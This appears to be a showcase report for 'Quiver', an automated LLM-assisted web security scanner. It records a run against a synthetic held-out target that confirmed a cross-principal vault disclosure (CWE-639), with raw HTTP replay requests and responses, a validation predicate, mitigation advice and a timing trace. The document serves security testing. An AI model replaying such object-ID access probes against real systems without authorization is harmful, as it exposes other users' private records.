# Quiver held-out showcase run

This committed sample is condensed from a live campaign on 2026-08-31. The
target was started with `QUIVER_HELD_OUT_SEED=showcase-2026-08-31`, producing the
previously unseen route namespace `n-1pgkba6`, randomized principals and vaults,
and canary `QUIVER-CANARY-0AVX45J`. Quiver received only the target URL and
profile—not the seed or ground truth.

## Outcome

| Metric                    |       Result |
| ------------------------- | -----------: |
| Confirmed                 |            1 |
| Rejected                  |            0 |
| Unvalidated               |            0 |
| Requests                  |        21/30 |
| Actionable route coverage |   100% (5/5) |
| Deterministic checks      | 10/10 passed |
| Duration                  |       185.0s |
| Model tokens              |       86,545 |
| Approximate model cost    |      $0.0038 |

## Discovery → hypothesis → exploit → proof

1. The crawler loaded `/` and randomized asset `/assets/bundle-1wzidap.js`.
2. It recovered five authenticated route shapes, including
   `/api/n-1pgkba6/vaults/{vaultId}` and the neighboring
   `/api/n-1pgkba6/profiles/{principalId}` control.
3. The explorers learned the current principal and owned vault from `/vaults`,
   then learned a colleague's randomized `featuredVaultId` from `/directory`.
4. The colleague's profile correctly returned `403`, but their vault returned
   `200` with a different owner and a payroll canary.
5. A fresh authenticated target session replayed the two-request proof. Quiver
   evaluated the submitted JSON pointers in code; the LLM reviewer could not set
   the outcome.

## Confirmed finding

### Cross-principal vault record disclosure

- Severity: **high**
- CWE: `CWE-639`
- Category: `broken-object-authorization`
- Endpoint: `/api/n-1pgkba6/vaults/{vaultId}`
- Fingerprint: `broken-object-authorization:GET:/api/n-1pgkba6/vaults/{id}`

The endpoint authenticates the caller but does not verify that the requested
vault belongs to that principal. A directory response supplies another
principal's vault ID; requesting it returns the owner's identity and a private
payroll record. The adjacent profile endpoint denies the same cross-principal
access, demonstrating the expected authorization boundary.

**Impact.** Any authenticated user can read another principal's private vault
contents. The returned `QUIVER-CANARY` establishes impact without relying on
real sensitive data.

**Mitigation.** Resolve the authenticated principal for every vault lookup and
return `403` or `404` unless the principal owns the vault or has an explicit
grant. Add cross-principal tests for every object-detail handler.

## Raw replay proof

Actor/ownership baseline:

```http
GET /api/n-1pgkba6/vaults
Authorization: Bearer <ordinary-user-token>

HTTP/1.1 200 OK
{
  "vaults": [{
    "id": "86dfc397-48ad-4d8c-a64b-b3e9b758bdae",
    "ownerId": "dd81e8ce-d7fe-4609-a46b-672c9fa35db7",
    "label": "My records"
  }]
}
```

Cross-principal access:

```http
GET /api/n-1pgkba6/vaults/31fb7fd2-0404-461d-a6af-ca90db5cd81b
Authorization: Bearer <ordinary-user-token>

HTTP/1.1 200 OK
{
  "id": "31fb7fd2-0404-461d-a6af-ca90db5cd81b",
  "owner": {
    "id": "182618d4-748b-409f-a553-70b654410011",
    "email": "held-out-owner@ledgerly.test"
  },
  "record": {
    "summary": "Cross-principal payroll record",
    "canary": "QUIVER-CANARY-0AVX45J"
  }
}
```

Authorization control:

```http
GET /api/n-1pgkba6/profiles/182618d4-748b-409f-a553-70b654410011
Authorization: Bearer <ordinary-user-token>

HTTP/1.1 403 Forbidden
{"error":"forbidden"}
```

## Deterministic predicate

```json
{
  "type": "cross-principal-access",
  "actor": { "requestIndex": 0, "jsonPointer": "/vaults/0/ownerId" },
  "resourceOwner": { "requestIndex": 1, "jsonPointer": "/owner/id" },
  "accessRequestIndex": 1,
  "evidencePointers": ["/owner/id", "/record/canary", "/record/summary"]
}
```

All ten code-owned checks passed: category compatibility, complete replay,
untruncated responses, actor identity present, resource-owner identity present,
different principals, successful access, and all three impact pointers present.

The informational LLM review also assessed the evidence as supported, but that
assessment did not affect the `confirmed` status.

## Trace

| Elapsed | Transition                 | Evidence                                                     |
| ------: | -------------------------- | ------------------------------------------------------------ |
|    0.0s | campaign start             | Fresh held-out profile and authenticated session             |
|    6.2s | crawl                      | `/` → `/assets/bundle-1wzidap.js` → five randomized routes   |
|   14.7s | identity/collection        | Current principal and owned vault established                |
|   24.3s | exploit                    | Foreign vault returned `200`; foreign profile returned `403` |
|   58.0s | hypothesis submitted       | CWE-639 with structured cross-principal predicate            |
|  160.7s | fresh replay               | Baseline and foreign vault repeated on validation target     |
|  180.1s | deterministic confirmation | 10/10 checks passed, including canary pointer                |
|  185.0s | complete                   | 1 confirmed, 0 false/unvalidated, 21/30 requests             |

Play the companion 75-second terminal replay with:

```sh
asciinema play docs/showcase/held-out-demo.cast
```
